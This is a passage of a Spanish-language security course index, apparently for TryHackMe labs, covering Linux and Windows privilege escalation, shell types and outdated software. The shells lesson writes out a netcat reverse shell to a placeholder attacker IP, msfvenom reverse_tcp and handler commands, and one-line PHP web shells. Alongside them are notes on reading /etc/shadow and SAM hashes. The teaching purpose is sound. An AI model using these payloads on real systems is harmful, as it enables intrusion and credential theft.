-maxdepth 1 -readable -type f\n</code></pre> Encontrar todos los directorios sobre los que tenemos permiso de escritura: <pre><code>$ find / -executable -writable -type d 2&gt; /dev/null\n</code></pre></p> <p>Task 3, 4 y 5 de THM</p> <p>El archivo <code>/etc/shadow</code> contiene los hashes de las contrase\u00f1as de usuario, y por de forma predeterminada no es legible por ning\u00fan usuario excepto root.</p> <p>Si podemos leer el contenido del archivo /etc/shadow, podr\u00edamos descifrar el hash de la contrase\u00f1a del usuario root.</p> <p>Si pudi\u00e9ramos modificar el archivo /etc/shadow, podemos reemplazar el hash de la contrase\u00f1a del usuario ra\u00edz con uno que conocemos.</p>"},{"location":"segof/privesc/#secuencias-de-escape","title":"Secuencias de escape","text":"<p>En la mayor\u00eda de ocasiones tenemos restricciones para ejecutar \u00fanicamente ciertos programas a trav\u00e9s de sudo. No obstante, puede darse el caso de que pueda \"escapar\" del programa y generar una shell. </p> <p>Cuando un programa se ejecuta con privilegios de root, tambi\u00e9n lo hace la shell que genera, por lo que puedo intentar conseguir una shell a trav\u00e9s de la ejecuci\u00f3n de ese programa.</p> <p>Se puede consultar una lista de programas con sus secuencias de escape correspondientes en GTFObins</p> <p>GTFOBins es un proyecto y una base de datos en l\u00ednea que recopila t\u00e9cnicas de escalaci\u00f3n de privilegios y explotaci\u00f3n de aplicaciones en sistemas Unix/Linux mediante el uso de binarios leg\u00edtimos que est\u00e1n preinstalados en muchas distribuciones. </p> <p>El nombre proviene de la expresi\u00f3n GTFO (\"Get The F* Out\") y bins (abreviatura de binarios).</p>"},{"location":"segof/privesc/#que-incluye-gtfobins","title":"\u00bfQu\u00e9 incluye GTFOBins?","text":"<ol> <li> <p>Binarios aprovechables: Son programas que pueden ser utilizados de manera inesperada para realizar acciones maliciosas, como escapar de restricciones de seguridad, ejecutar comandos como otro usuario o incluso obtener acceso root.</p> </li> <li> <p>Categor\u00edas de uso: Cada binario incluye ejemplos clasificados seg\u00fan el objetivo que se busca alcanzar, tales como:</p> </li> <li>Escaparse de entornos restringidos (jails o sandboxes).</li> <li>Leer o escribir archivos sensibles.</li> <li>Escalar privilegios.</li> <li>Establecer conexiones de red.</li> <li>Ejecutar comandos como superusuario o utilizando SUID/SGID.</li> </ol> <p>Procedimiento:</p> <ol> <li> <p>Listar los programas que un usuario tiene permitido ejecutar como sudo:</p> <pre><code>$ sudo -l\n...\n(root) NOPASSWD: /usr/sbin/iftop\n(root) NOPASSWD: /usr/bin/find\n(root) NOPASSWD: /usr/bin/nano\n(root) NOPASSWD: /usr/bin/vim\n(root) NOPASSWD: /usr/bin/man\n(root) NOPASSWD: /usr/bin/awk\n...\n</code></pre> </li> <li> <p>Para cada programa de la lista, comprobar si existe una secuencia de escape en GTFObins</p> </li> <li> <p>Si existe una secuencia de escape, ejecutar el programa con sudo e intentar utilizar dicha secuencia para desplegar una shell de root.</p> </li> </ol> <p>Task 6 de THM</p> <p>Obt\u00e9n un terminal de root haciendo uso al menos de 3 secuencias de escape diferentes</p>"},{"location":"segof/privesc/#tareas-del-cron-y-permisos-de-archivos","title":"Tareas del cron y permisos de archivos","text":"<p>Las tareas programadas en el cron son programas o scripts cuyos usuarios pueden programar para que se ejecuten en momentos concretos o a intervalos.</p> <p>Las tareas del cron se ejecutan con el nivel de seguridad del usuario propietario de las mismas. Por defecto, las tareas del cron usan el terminal <code>/bin/bash</code> con determinadas limitaciones.</p> <p>La configuraci\u00f3n de estas tareas se realiza en crontab. Los crontab de los usuarios suelen esar localizados en <code>/var/spool/cron/</code> o <code>/var/spool/cron/crontabs</code></p> <p>El crontab del sistema est\u00e1 ubicado en <code>/etc/crontab</code>.</p> <p>Task 8 de THM</p> <p>Consigue una shell de root aprovech\u00e1ndote de la mala configuraci\u00f3n del crontab.</p> <p>Shell inversa</p> <p>Ayuda para entender los conceptos shell directa y shell inversa</p>"},{"location":"segof/privesc/#archivos-de-historial","title":"Archivos de historial","text":"<p>Los archivos de historial registran los comandos utilizados por los usuarios mientras est\u00e1n usando ciertos programas.</p> <p>Si un usuario escribe una contrase\u00f1a como parte de un comando, esta contrase\u00f1a puede almacenarse en un archivo de historial. Como atacante, siempre es una buena idea intentar cambiar al usuario root con un contrase\u00f1a que ha sido revelada mediante este m\u00e9todo..</p> <p>Task 16 de THM</p> <p>Consigue una shell de root aprovech\u00e1ndote del historial de comandos.</p>"},{"location":"segof/privesc/#archivos-de-configuracion","title":"Archivos de configuraci\u00f3n","text":"<p>Muchos servicios y programas utilizan archivos de texto (config) para almacenar la configuraci\u00f3n.</p> <p>Si un servicio necesita autenticarse en algo, puede almacenar las credenciales en un archivo de configuraci\u00f3n a pesar de ser una muy mala pr\u00e1ctica.</p> <p>Si se puede acceder a estos archivos de configuraci\u00f3n y los usuarios privilegiados reutilizan las contrase\u00f1as que almacenan, es posible que podamos usarlos para iniciar sesi\u00f3n como ese usuario en otros servicios o sistemas.</p> <p>Task 17 de THM</p> <p>Consigue una shell de root aprovech\u00e1ndote de la informaci\u00f3n encontrada en alg\u00fan archivo de configuraci\u00f3n.</p>"},{"location":"segof/privesc/#claves-ssh","title":"Claves SSH","text":"<p>Se pueden utilizar claves SSH en lugar de contrase\u00f1as para autenticar a los usuarios mediante SSH.</p> <p>Las claves SSH vienen en pares: una clave privada y una clave p\u00fablica. La clave privada siempre debe mantenerse en secreto.</p> <p>Si un usuario ha almacenado su clave privada de forma insegura, cualquiera que pueda leer la clave puede iniciar sesi\u00f3n en su cuenta us\u00e1ndola. </p> <p>Task 18 de THM</p> <p>Consigue una shell de root aprovech\u00e1ndote de las claves SSH del sistema.</p>"},{"location":"segof/privesc/#escalada-de-privilegios-en-windows","title":"Escalada de privilegios en Windows","text":"<p>En una escalada de privilegios en Windows nuestro objetivo ser\u00e1 obtener una shell corriendo como Administrador o como el usuario SYSTEM.</p> <p>De igual forma que ocurr\u00eda en Linux, una escalada de privilegios puede ser sencilla o necesitar un detallad\u00edsimo reconocimiento del sistema previamente comprometido. </p> <p>Veamos algunos conceptos b\u00e1sicos a modo de recordatorio.</p>"},{"location":"segof/privesc/#conceptos-previos","title":"Conceptos previos","text":""},{"location":"segof/privesc/#cuentas-de-usuario","title":"Cuentas de usuario","text":"<p>Las cuentas de usuario se utilizan para iniciar sesi\u00f3n en un sistema Windows.</p> <p>Pensad en una cuenta de usuario como una colecci\u00f3n de configuraciones/preferencias ligado a una identidad \u00fanica.</p> <p>La cuenta de \"Administrador\" local se crea de forma predeterminada en instalaci\u00f3n. Pueden existir varias otras cuentas de usuario predeterminadas (por ejemplo, Invitado) dependiendo de la versi\u00f3n de Windows. </p>"},{"location":"segof/privesc/#cuentas-de-servicio","title":"Cuentas de servicio","text":"<p>Las cuentas de servicio se utilizan, obviamente, para ejecutar servicios en Windows.</p> <p>Las cuentas de servicio NO se pueden utilizar para iniciar sesi\u00f3n en un sistema Windows. La cuenta del SYSTEM es una cuenta de servicio predeterminada que tiene unos mayores privilegios que cualquier cuenta local en Windows.</p> <p>Otras cuentas de servicio predeterminadas incluyen NETWORK SERVICES y LOCAL SERVICE.</p>"},{"location":"segof/privesc/#grupos","title":"Grupos","text":"<p>Las cuentas de usuario pueden pertenecer a varios grupos y los grupos pueden tener varios usuarios. Los grupos permiten un control de acceso m\u00e1s f\u00e1cil a los recursos.</p> <p>Los grupos regulares (por ejemplo, administradores, usuarios) tienen una lista establecida de miembros.</p> <p>Los pseudogrupos (p. Ej., \"Usuarios autenticados\") tienen una lista din\u00e1mica de miembros que cambia en funci\u00f3n de determinadas interacciones. </p>"},{"location":"segof/privesc/#recursos","title":"Recursos","text":"<p>En Windows, existen varios tipos de recursos (tambi\u00e9n conocidos como objetos):</p> <ul> <li>Archivos / Directorios</li> <li>Entradas de registro</li> <li>Servicios</li> </ul> <p>Si un usuario y/o grupo tiene permiso para realizar una determinada acci\u00f3n de un recurso dependerla de la lista de control de acceso (ACL) de ese recurso. </p>"},{"location":"segof/privesc/#acl-y-ace","title":"ACL y ACE","text":"<p>Los permisos para acceder a un determinado recurso en Windows son controlados por la lista de control de acceso (ACL) para ese recurso.</p> <p>Cada ACL se compone de cero o m\u00e1s entradas de control de acceso (ACE).</p> <p>As\u00ed pues, una ACL es una lista ordenada de ACE que define las protecciones que se aplican a un objeto y sus propiedades. Cada ACE identifica una entidad de seguridad y especifica un conjunto de derechos de acceso que est\u00e1n permitidos, denegados o auditados para esa entidad de seguridad.</p> <p>Cuando un usuario intenta acceder a un archivo, el sistema de Windows ejecuta un AccessCheck y compara el descriptor de seguridad con el token de acceso de los usuarios y eval\u00faa si el usuario tiene acceso y qu\u00e9 tipo de acceso seg\u00fan el conjunto de ACE. </p> <p>Cada ACE define la relaci\u00f3n entre un principal (por ejemplo, un usuario, grupo) y un cierto derecho de acceso </p>"},{"location":"segof/privesc/#ejercicios_1","title":"Ejercicios","text":"<p>Cada una de las siguientes escaladas de privilegios la vamos a probar en la sala Windows PrivEsc de Tryhackme a la que deb\u00e9is uniros.</p>"},{"location":"segof/privesc/#pemisos-inseguros-de-servicios","title":"Pemisos inseguros de servicios","text":"<p>Cada servicio tiene una ACL que define ciertos permisos espec\u00edficos para ese servicio.</p> <ul> <li> <p>Algunos permisos son inocuos (por ejemplo, SERVICE_QUERY_CONFIG, SERVICE_QUERY_STATUS).</p> </li> <li> <p>Algunos pueden resultar \u00fatiles (p. Ej., SERVICE_STOP, SERVICE_START).</p> </li> <li> <p>Algunos son peligrosos (p. Ej., SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS) </p> </li> </ul> <p>Si nuestro usuario tiene permiso para cambiar la configuraci\u00f3n de un servicio que se ejecuta con privilegios de SYSTEM, podemos cambiar el ejecutable que utiliza el servicio por uno de nuestra propia cosecha.</p> <p>Potencial callej\u00f3n sin salida: si se puede cambiar la configuraci\u00f3n de un servicio pero no puede reiniciar el servicio, \u00a1no ser\u00e1 posible escalar privilegios! </p> <p>Task 3 de THM</p>"},{"location":"segof/privesc/#rutas-de-servicios-sin-entrecomillado","title":"Rutas de servicios sin entrecomillado","text":"<p>Los ejecutables en Windows se pueden ejecutar sin usar su extensi\u00f3n (por ejemplo, \"whoami.exe\" se puede ejecutar con solo escribir \"whoami\"). Algunos ejecutables aceptan argumentos separados por espacios, p.Ej.: someprog.exe arg1 arg2 arg3 ...</p> <p>Este comportamiento conduce a la ambig\u00fcedad cuando se utilizan rutas absolutas que est\u00e1n sin comillas y contienen espacios.</p> <p>Considerad la siguiente ruta sin comillas:</p> <p>C:\\Program FIles\\Algun directorio\\SomeProgram.exe</p> <p>Para nosotros, esto obviamente ejecuta SomeProgram.exe. Para Windows, C:\\Program podr\u00eda ser el ejecutable, con dos argumentos: \"Files\\Algun\" y \"directorio\\SomeProgram.exe\"</p> <p>Windows resuelve esta ambig\u00fcedad comprobando cada una de las posibilidades por turno.</p> <p>Si podemos escribir en una ubicaci\u00f3n que Windows compruebe antes del ejecutable real, podremos enga\u00f1ar al servicio para que lo ejecute.</p> <p>Task 4 de THM</p> <p>Obt\u00e9n una shell de Administrador haciendo uso de esta escalada de privilegios.</p>"},{"location":"segof/privesc/#ejecutables-de-servicios-inseguros","title":"Ejecutables de servicios inseguros","text":"<p>Si el ejecutable del servicio original es modificable por nuestro usuario, podemos simplemente reemplazarlo con el ejecutable de nuestra shell inversa.</p> <p>\u00a1Recordad crear una copia de seguridad del ejecutable original si se trata de en un sistema real! </p> <p>Task 6 de THM</p> <p>Obt\u00e9n una shell de Administrador haciendo uso de esta escalada de privilegios.</p>"},{"location":"segof/privesc/#credenciales-almacenadas","title":"Credenciales almacenadas","text":"<p>Windows tiene el comando \"runas\" o \"Ejecutar como\" que permite a los usuarios ejecutar comandos con los privilegios de otros usuarios. Por lo general, esto requiere el conocimiento de la contrase\u00f1a de esos usuarios.</p> <p>Sin embargo, Windows tambi\u00e9n permite a los usuarios guardar sus credenciales en el sistema y estas credenciales guardadas se pueden utilizar para que se omita este requisito. </p> <p>Task 10 de THM</p> <p>Obt\u00e9n una shell de Administrador haciendo uso de esta escalada de privilegios.</p>"},{"location":"segof/privesc/#security-account-manager-sam","title":"Security Account Manager (SAM)","text":"<p>Windows almacena hashes de contrase\u00f1a en el Security Account Manager (SAM).</p> <p>Los hashes est\u00e1n cifrados con una clave que se puede encontrar en un archivo llamado SYSTEM.</p> <p>Si se tiene la capacidad de leer los archivos SAM y SYSTEM, se pueden extraer los hashes. Los archivos SAM y SYSTEM se encuentran en el directorio <code>C:\\Windows\\System32\\config</code>.</p> <p>Estos archivos se bloquean mientras se ejecuta Windows. Sin embargo, podr\u00edan existir copias de seguridad de los archivos en los directorios <code>C:\\Windows\\Repair</code> o <code>C:\\Windows\\System32\\config\\RegBack</code>.</p> <p>Task 11 de THM</p> <p>Obt\u00e9n una shell de Administrador haciendo uso de esta escalada de privilegios.</p>"},{"location":"segof/privesc/#tareas-programadas","title":"Tareas programadas","text":"<p>Windows se puede configurar para ejecutar tareas en momentos concretos, peri\u00f3dicamente (por ejemplo, cada 5 minutos) o cuando se activa por alg\u00fan evento (por ejemplo, un inicio de sesi\u00f3n de usuario).</p> <p>Las tareas generalmente se ejecutan con los privilegios del usuario que las cre\u00f3, sin embargo los administradores pueden configurar tareas para que se ejecuten con los privilegios de otros usuarios, incluido SYSTEM.</p> <p>Task 13 de THM</p> <p>Obt\u00e9n una shell de Administrador haciendo uso de esta escalada de privilegios.</p>"},{"location":"segof/rev_shell/","title":"Una revisi\u00f3n de las shells","text":""},{"location":"segof/rev_shell/#que-es-una-shell","title":"\u00bfQu\u00e9 es una shell?","text":"<p>Una shell es un software que permite al usuario interactuar con un sistema operativo, normalmente es una interfaz de l\u00ednea de comandos.</p> <p>En ciberseguridad, nos referimos com\u00fanmente a una sesi\u00f3n shell espec\u00edfica que un atacante utiliza cuando accede a un sistema comprometido, permiti\u00e9ndole ejecutar diferentes comandos. Esto permitir\u00e1 llevar a cabo varias actividades, algunas de las cuales se describen a continuaci\u00f3n.</p> <ul> <li>Control remoto del sistema: permite al atacante ejecutar comandos o software de forma remota en el sistema objetivo.</li> <li>Escalada de privilegios: Si el acceso inicial a trav\u00e9s de una shell est\u00e1 limitado o restringido, los atacantes pueden explorar formas de escalar privilegios a accesos m\u00e1s elevados o administrativos.</li> <li>Exfiltraci\u00f3n de datos: Una vez que los atacantes tienen acceso para ejecutar comandos a trav\u00e9s de un shell obtenido, pueden explorar el sistema para leer y copiar datos sensibles del mismo.</li> <li>Persistencia y Acceso de Mantenimiento: Una vez obtenido el acceso al shell, los atacantes pueden crear accesos a trav\u00e9s de usuarios y credenciales o copiar software de puerta trasera para mantener el acceso al sistema objetivo para su uso posterior.</li> <li>Actividades posteriores a la explotaci\u00f3n: Una vez concedido el acceso a un shell, los atacantes pueden realizar una amplia gama de actividades posteriores a la explotaci\u00f3n, como desplegar malware, crear cuentas ocultas y eliminar informaci\u00f3n.</li> <li>Acceder a otros sistemas de la red: Dependiendo de las intenciones del atacante, el shell obtenido puede ser s\u00f3lo un punto de acceso inicial. El objetivo puede ser saltar a trav\u00e9s de la red hacia un objetivo diferente utilizando la shell obtenida como pivote hacia diferentes puntos de la red del sistema comprometido. Esto tambi\u00e9n se conoce como pivoting o movimiento lateral.</li> </ul>"},{"location":"segof/rev_shell/#tipos-de-shell","title":"Tipos de shell","text":""},{"location":"segof/rev_shell/#reverse-shell","title":"Reverse shell","text":"<ul> <li> <p>Definici\u00f3n: Un reverse shell es un tipo de acceso remoto donde la m\u00e1quina objetivo (v\u00edctima) inicia una conexi\u00f3n saliente a la m\u00e1quina del atacante. Esta conexi\u00f3n permite al atacante acceder a la l\u00ednea de comandos de la m\u00e1quina objetivo.</p> </li> <li> <p>C\u00f3mo funciona: En una configuraci\u00f3n de shell inversa, el atacante configura un listener en un puerto espec\u00edfico. Una vez que la carga se ejecuta en la m\u00e1quina de destino, se conecta de nuevo a la m\u00e1quina del atacante, creando una interfaz de l\u00ednea de comandos a trav\u00e9s de la red.</p> </li> <li> <p>Por qu\u00e9 usar Reverse Shells: Los shells inversos se utilizan a menudo para eludir cortafuegos y configuraciones NAT (Network Address Translation), que normalmente bloquean las conexiones entrantes pero permiten las salientes. Al iniciar una conexi\u00f3n saliente desde el objetivo, los shells inversos aprovechan esta apertura en el cortafuegos.</p> </li> </ul> <p>Ejemplo <p>Netcat es una herramienta que soporta m\u00faltiples sistemas oprativos, permite lecturas y escrituras a trav\u00e9s de la red. </p> <p>El atacante utiliza Netcat para escuchar en el puerto 4444:</p> <pre><code>nc -lvp 4444\n</code></pre> <p>A continuaci\u00f3n, el objetivo o v\u00edctima ejecuta un payload para conectarse de nuevo a la m\u00e1quina del atacante: <pre><code>nc [atacante_IP] 4444 -e /bin/bash\n</code></pre></p> <p>Esta configuraci\u00f3n permite al atacante controlar el int\u00e9rprete de comandos de la v\u00edctima a trav\u00e9s de la red.</p>"},{"location":"segof/rev_shell/#bind-shell","title":"Bind shell","text":"<ul> <li> <p>Definici\u00f3n: En una bind shell, la m\u00e1quina objetivo escucha en un puerto espec\u00edfico, esperando una conexi\u00f3n entrante del atacante. Una vez que el atacante se conecta, obtiene acceso remoto a la l\u00ednea de comandos.</p> </li> <li> <p>C\u00f3mo funciona: Con una bind shell la m\u00e1quina objetivo se convierte en el oyente y abre un puerto de red, vinculando un shell a ese puerto. El atacante se conecta a este puerto abierto para obtener acceso.</p> </li> <li> <p>Limitaciones de Bind Shells: Los Bind Shells son m\u00e1s dif\u00edciles de usar en entornos con cortafuegos restrictivos o NAT porque requieren que la m\u00e1quina de destino acepte conexiones entrantes en un puerto espec\u00edfico.</p> </li> </ul> <p>Ejemplo <p>La m\u00e1quina destino utiliza Netcat para configurar un bind shell:</p> <p><pre><code>nc -lvp 4444 -e /bin/bash\n</code></pre> A continuaci\u00f3n, el atacante se conecta a la IP y al puerto de la m\u00e1quina objetivo: <pre><code>nc [IP_objetivo] 4444\n</code></pre></p> <p>Reverse shells VS Bind shells</p> <ul> <li>Las Reverse Shells se prefieren en entornos seguros porque inician conexiones salientes, a menudo permitidas por cortafuegos.</li> <li>Las Bind Shells requieren un puerto de entrada abierto, que a menudo es bloqueado por los cortafuegos, haci\u00e9ndolos m\u00e1s dif\u00edciles de ejecutar en las redes modernas.</li> </ul>"},{"location":"segof/rev_shell/#listeners","title":"Listeners","text":"<ul> <li> <p>Definici\u00f3n: Un listener es un proceso configurado por el atacante para esperar una conexi\u00f3n entrante desde una m\u00e1quina objetivo. El listener es cr\u00edtico para establecer tanto reverse como bind shells.</p> </li> <li> <p>Prop\u00f3sito: El listener act\u00faa como receptor, esperando a que la m\u00e1quina objetivo inicie una conexi\u00f3n (en reverse shells) o se conecte a un puerto abierto del objetivo (en bind shells).</p> </li> </ul>"},{"location":"segof/rev_shell/#herramientas-comunes","title":"Herramientas comunes","text":"<ul> <li> <p>Netcat (nc): Una de las herramientas m\u00e1s sencillas y utilizadas para configurar escuchas.</p> </li> <li> <p>Metasploit Multi/Handler: La herramienta <code>multi/handler</code> de Metasploit est\u00e1 dise\u00f1ada para gestionar listeners para varios tipos de payloads, incluyendo reverse shells, proporcionando flexibilidad y caracter\u00edsticas m\u00e1s all\u00e1 de lo que ofrece Netcat.</p> </li> </ul> <p>Ejemplo de listener de Netcat: <pre><code>nc -lvp 4444 # escucha en el puerto 4444 cualquier conexi\u00f3n entrante\n</code></pre></p>"},{"location":"segof/rev_shell/#payloads","title":"Payloads","text":"<ul> <li>Definici\u00f3n: Un payload es una pieza de c\u00f3digo que se ejecuta en la m\u00e1quina objetivo para establecer una conexi\u00f3n de vuelta al atacante o abrir un puerto para que el atacante se conecte. La carga \u00fatil puede iniciar un shell inverso o bind y puede variar en funci\u00f3n del sistema operativo de destino, el tipo de shell o las necesidades de evasi\u00f3n.</li> </ul>"},{"location":"segof/rev_shell/#tipos-de-payloads","title":"Tipos de payloads","text":"<ul> <li>Payload de shell inversa: Dise\u00f1ado para iniciar una conexi\u00f3n saliente desde la m\u00e1quina objetivo de vuelta al atacante.</li> <li>Payload para bind shell: Configurar un oyente en el objetivo para que el atacante se conecte.</li> <li>Payloads en scripts: Los payloads personalizadas tambi\u00e9n pueden escribirse en lenguajes de scripting como Bash, Python, PowerShell o incluso JavaScript, dependiendo del objetivo y del contexto del ataque.</li> </ul>"},{"location":"segof/rev_shell/#usando-metasploit-para-payloads","title":"Usando Metasploit para Payloads","text":"<p>Metasploit provee payloads pre-construidos que pueden ser usados para generar reverse o bind shells.</p> <p>Ejemplo de comando: <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=[attacker_IP] LPORT=4444 -f exe -o shell.exe</code>.</p>"},{"location":"segof/rev_shell/#web-shells","title":"Web Shells","text":"<ul> <li>Definici\u00f3n: Un web shell es un tipo de shell que se aloja en un servidor web, permitiendo a los atacantes interactuar con el servidor a trav\u00e9s de una interfaz web. Normalmente se trata de un peque\u00f1o script subido al servidor para ejecutar comandos del sistema.</li> </ul>"},{"location":"segof/rev_shell/#proposito-y-uso","title":"Prop\u00f3sito y uso","text":"<ul> <li>Los atacantes utilizan web shells para obtener acceso persistente a un servidor web comprometido.</li> <li>Las web shells permiten a los atacantes ejecutar comandos, subir archivos y ejecutar scripts adicionales en el servidor.</li> </ul>"},{"location":"segof/rev_shell/#lenguajes-comunes-para-web-shells","title":"Lenguajes comunes para Web Shells","text":"<ul> <li>PHP:  Esta simple shell PHP toma un par\u00e1metro <code>cmd</code> y lo ejecuta en el servidor: <code>&lt;?php system($_GET['cmd']); ?&gt;</code> -</li> <li>ASP/ASPX (utilizado en servidores Windows).</li> <li>JSP (Java Server Pages) para servidores basados en Java.</li> </ul>"},{"location":"segof/rev_shell/#deteccion-y-defensa","title":"Detecci\u00f3n y defensa","text":"<ul> <li>Vigilancia de la integridad de los archivos: Comprobaci\u00f3n de cambios no autorizados en directorios web.</li> <li>WAF (Web Application Firewalls): Los WAF suelen detectar y bloquear los web shells.</li> <li>An\u00e1lisis de contenido: Escaneo de archivos en el servidor en busca de patrones comunes de web shell o c\u00f3digo sospechoso.</li> </ul>"},{"location":"segof/rev_shell/#resumen-de-escenarios-de-ejemplo","title":"Resumen de escenarios de ejemplo","text":"<ol> <li> <p>Shell inversa con Netcat:</p> <ul> <li> <p>Atacante (Listener):    <pre><code>nc -lvp 4444\n</code></pre>    La opci\u00f3n -l le indica a netcat que espere una conexi\u00f3n, -v activa la salida detallada del comando, -n impide que las conexiones hagan uso de una b\u00fasqueda DNS (no se resolver\u00e1 ning\u00fan nombre, se utilizar\u00e1n IPs). Finalmente la opci\u00f3n -p indica el puerto en el que se escuchar\u00e1 en espera de conexciones entrantes.</p> </li> <li> <p>V\u00edctima (Payload):    <pre><code>nc [atacante_IP] 4444 -e /bin/bash\n</code></pre></p> <p>Se podr\u00eda utilizar cualquier puerto libre para escuchar.</p> </li> </ul> </li> <li> <p>Metasploit Reverse TCP Payload:</p> <ul> <li>Generar un payload:   <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=[attacker_IP] LPORT=4444 -f exe -o reverse_shell.exe\n</code></pre></li> <li>Escucha en Metasploit:   <pre><code>msfconsole\nuse exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST [atacante_IP]\nset LPORT 4444\nexploit\n</code></pre></li> </ul> </li> <li> <p>Shell Web PHP:</p> <ul> <li>Crea una shell web PHP b\u00e1sica y s\u00fabela a un servidor web vulnerable.   <pre><code>&lt;?php echo shell_exec($_GET['cmd']); ?&gt;\n</code></pre></li> <li>Accede a la web shell navegando a <code>http://victima.com/shell.php?cmd=whoami</code>.</li> </ul> </li> </ol>"},{"location":"segof/rev_shell/#medidas-defensivas","title":"Medidas defensivas","text":"<ol> <li>Reglas de cortafuegos: Restringir el tr\u00e1fico saliente a puertos espec\u00edficos para evitar que las reverse shells establezcan conexiones.</li> <li>Sistemas de detecci\u00f3n de intrusos: Utiliza herramientas como Suricata o Snort para detectar firmas comunes de shell y comportamientos inusuales en la red.</li> <li>Seguridad de puntos finales: Despliegue soluciones EDR que supervisen procesos y conexiones de red an\u00f3malos.</li> <li>Seguridad de aplicaciones web: Analice regularmente las aplicaciones web en busca de vulnerabilidades que podr\u00edan permitir a los atacantes cargar web shells.</li> </ol>"},{"location":"segof/rev_shell/#ejercicios-propuestos","title":"Ejercicios propuestos","text":"<ol> <li> <p>Realizar la m\u00e1quina Vulnversity en TryHackMe. Se trata de una m\u00e1quina guiada donde repasamos fases que ya hemos visto: escaneo, enumeraci\u00f3n y explotaci\u00f3n mediante vulnerabilidad. Finalmente veremos una forma de obtener una shell inversa utilizando PHP. NO HACER LA PARTE DE ESCALADA DE PRIVILEGIOS.</p> </li> <li> <p>Realizar la m\u00e1quina Thomson en TryHackMe. Se trata de una m\u00e1quina no guiada donde tras la fase de escaneo y enumeraci\u00f3n deb\u00e9is conseguir acceso a un famoso servidor de aplicaciones y tras ello crear con msfvenom una shell inversa en formato .war, que se desplegar\u00e1 en dicho servidor.     Al acceder al .war desplegado, se establecer\u00e1 nuestra conexi\u00f3n inversa. Esta p\u00e1gina os puede resultar de inmensa ayuda: https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom</p> </li> <li> <p>Realizar las fases que os marco en la imagen de abajo de la m\u00e1quina RootMe en TryHackMe. </p> <p></p> <p>En este caso deb\u00e9is escanear con nmap, descubrir (mediante gobuster o ffuf) un directorio donde pod\u00e1is subir archivos y, una vez en \u00e9l, subir una reverse shell en formato .phtml. Pod\u00e9is bajar cualquier shell prefabricada en PHP o generarla vosotros con ayuda de esto o de esto.</p> </li> </ol>"},{"location":"segof/servicios_desact/","title":"Servicios desactualizados","text":"<p>A d\u00eda de hoy se podr\u00eda decir que el incidente de seguridad m\u00e1s sufrido por las empresas es sin duda la infecci\u00f3n de ransomware, normalmente mediante alg\u00fan ataque previo exitoso de phising.</p> <p>Sin embargo, otro vector de ataque muy importante viene dado por los sistemas desactualizados. </p> <p>Algunas cosas se han fabricado para durar para siempre. El software no es una de ellas.</p> <p>De hecho, el software se parece m\u00e1s a la comida: caduca. Puede que est\u00e9 bien un poco despu\u00e9s de su fecha de caducidad, pero luego se pudre, se enmohece. Y cuanto m\u00e1s lo dejas, peor se pone. Pero no es un desgradable caso de intoxicaci\u00f3n alimentaria a lo que nos arriesgaremos, precisamente. El software obsoleto corre el riesgo de envenenar los sistemas del negocio y causar estragos en la seguridad.</p> <p>De hecho, el software obsoleto posee una serie de vulnerabilidades de seguridad. Si est\u00e1 presente en alguno de los sistemas, se est\u00e1 poniendo en riesgo los datos y su negocio.</p> <p>Ya vimos con anterioridad como pod\u00edan existir exploits 0-day que, en un principio, al ser desconocida la vulnerabilidad que aprovechan, nos hacen imposible tener el sistema actualizado o parcheado. No obstante, en cu\u00e1nto surgen parches de seguridad dirigidos a solucionar estos problemas, deben ser aplicados, con mayor celeridad si cabe si hablamos de vulnerabilidades graves.</p> <p>Un buen ejemplo actual de la importancia de mantenerse al d\u00eda con los parches de seguridad es la reciente vulnerabilidad cr\u00edtica en log4j, con varios parches consecutivos en tiempo r\u00e9cord a medida que se iban descubriendo nuevas vulnerabilidades: log4j</p>"},{"location":"segof/servicios_desact/#el-riesgo-de-seguridad-de-los-sistemas-y-servicios-desactualizados","title":"El riesgo de seguridad de los sistemas y servicios desactualizados","text":""},{"location":"segof/servicios_desact/#por-que-representa-el-software-desactualizado-un-riesgo","title":"\u00bfPor qu\u00e9 representa el software desactualizado un riesgo?","text":"<p>La tecnolog\u00eda se desarrolla a un ritmo r\u00e1pido, en constante evoluci\u00f3n y est\u00e1 impulsada por la innovaci\u00f3n. Como resultado, el software tiene un ciclo de vida corto, uno sostenido por updates y upgrades continuos .</p> <p>Cuando el software ya no tiene actualizaciones para mantenerlo, se vuelve obsoleto. Este software obsoleto no se mantiene, no puede integrarse con nuevas aplicaciones, ni puede funcionar sin problemas en nuevos dispositivos.</p> <p>Luego existen otros riesgos a considerar. El software obsoleto no tiene parches si se le encuentran vulnerabilidades y puede ser v\u00edctima de ciberataques mucho m\u00e1s avanzados. Esto plantea una conjunci\u00f3n de riesgos de seguridad, tanto debido a la malicia humana como a las posibilidades de fallo del sistema.</p>"},{"location":"segof/servicios_desact/#malicia-humana","title":"Malicia humana","text":"<p>As\u00ed como la tecnolog\u00eda y el software cambian y avanzan en poco tiempo, tambi\u00e9n lo hacen las ciberamenazas. Los virus, el malware y los ataques se vuelven cada vez m\u00e1s sofisticados. Adem\u00e1s, los ciberdelincuentes conocen y pueden aprovechar las debilidades del software obsoleto.</p> <p>Como resultado, es posible que el software obsoleto no pueda resistir un ciberataque moderno.</p> <p>Por lo tanto, si ese software obsoleto incluye el uso, almacenamiento o aplicaci\u00f3n de datos, esos datos se ponen en claro riesgo. Los sistemas ser\u00e1n m\u00e1s vulnerables a los ataques de ransomware, malware y filtraciones. El software desactualizado puede por tanto darle a los atacantes una puerta de entrada al resto de sistemas.</p> <p>Los fallos de seguridad plantean problemas de compliance (cumplimiento normativo) posteriores. En t\u00e9rminos de GDPR, no tener un software actualizado podr\u00eda verse como una forma de negligencia. Esto significa que si se tiene un software desactualizado y se sufre una brecha de seguridad relacionada, no solo se pierde la confianza de los clientes, sino que adem\u00e1s podr\u00edamos enfrentarnos a una fuerte multa.</p>"},{"location":"segof/servicios_desact/#fallo-del-sistema","title":"Fallo del sistema","text":"<p>El software obsoleto no solo causa que la seguridad sea susceptible de ser afectada por la maldad humana, sino tambi\u00e9n por fallos del sistema.</p> <p>Un software obsoleto es aquel que ya no tiene soporte por parte del proveedor. Esto significa que los nuevos fallos encontrados en \u00e9l no se solucionar\u00e1n. Adem\u00e1s, es cada vez menos probable que el software desactualizado funcione en hardware nuevo y siga siendo compatible con los sistemas operativos m\u00e1s 